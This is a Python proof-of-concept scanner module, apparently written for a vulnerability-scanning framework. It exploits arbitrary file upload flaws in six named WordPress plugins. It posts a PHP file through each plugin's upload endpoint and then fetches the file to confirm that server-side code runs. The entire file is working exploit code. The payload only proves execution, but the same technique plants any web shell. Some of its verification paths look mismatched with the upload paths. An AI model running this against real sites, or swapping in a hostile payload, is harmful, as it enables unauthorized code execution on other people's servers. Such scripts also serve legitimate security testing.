#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#the refers follow the order:
#refer:http://www.beebeeto.com/pdb/poc-2015-0098/, http://1337day.com/exploit/23540, https://www.exploit-db.com/exploits/36640/
#refer:https://www.exploit-db.com/exploits/35057/
#refer:https://www.exploit-db.com/exploits/36691/
#refer:https://www.exploit-db.com/exploits/36613/
#refer:https://www.exploit-db.com/exploits/36617/
#refer:https://www.exploit-db.com/exploits/36478/

import sys
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload_url = {'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php',
                   '/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php',
                   '/wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php',
                   '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php',
                   '/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php',
                   '/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php',
                     }
    verify_url = {'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/',
                  '/wp-content/plugins/sexy-contact-form/includes/fileupload/files/',
                  '/wp-content/uploads/i-dump-uploads/',
                  '/wp-content/plugins/simple-ads-manager/uploadfile/',
                  '/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads/',
                  '/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/k3dz.php',
                  }
    data = ''
    data += "------WebKitFormBoundaryoWXEZaqFafD1oOAq\n"
    data += "Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"\n\n"
    data += "<?php echo md5(1)?>\n"
    data += "------WebKitFormBoundaryoWXEZaqFafD1oOAq\n"
    header1 = "Content-Length: 172"
    header2 = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoWXEZaqFafD1oOAq"
    for payload in payload_url:
        url_payload = arg + payload
        code, head, res, _, _ = curl.curl('-H \'%s\' -H \'%s\' -d \'%s\' %s' % (header1, header2, data, url_payload))
    for payload in verify_url:
        url_verify = arg + payload + '1.php'
        code, head, res, _, _ = curl.curl('%s' % (url_verify))
        if code == 200 and res.find('c4ca4238a0b923820dcc509a6f75849b') != -1:
            security_hole(url_verify + ': Arbitrary File Upload(Please browse the refer of this Plugin to know more details)')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
